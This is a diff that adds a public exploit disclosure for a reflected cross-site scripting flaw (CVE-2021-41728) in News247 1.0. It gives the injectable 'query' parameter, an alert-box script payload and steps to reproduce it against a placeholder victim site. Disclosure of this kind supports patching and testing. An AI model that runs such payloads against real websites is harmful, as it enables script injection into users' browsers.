@@ -1,0 +1,18 @@
+# Exploit Title: News247 - 'query' Reflected XSS
+# Exploit Author: Daniel Haro (Dirox)
+# Vendor Homepage: https://www.sourcecodester.com/php/14952/news247-news-magazine-php-script.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14952&title=News247+-+News+Magazine+%28CMS%29+using+PHP+Free+Source+Code
+# Version: News247 1.0
+# Tested on: Debian 10, Apache
+# CVE: CVE-2021-41728
+
+- Description:
+A XSS issue in News247 v.1.0 allows remote attackers to inject JavaScript via /articles in the "query" parameter.
+
+- Payload used:
+x"><script>alert(2)</script>
+
+- Steps to reproduce:
+1- Go to http://victim.com
+2- In "forum search" option, paste the payload
+3- Alert will pop up in a link like: https://victim.com/articles?query=x%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E&search=%E2%9C%93
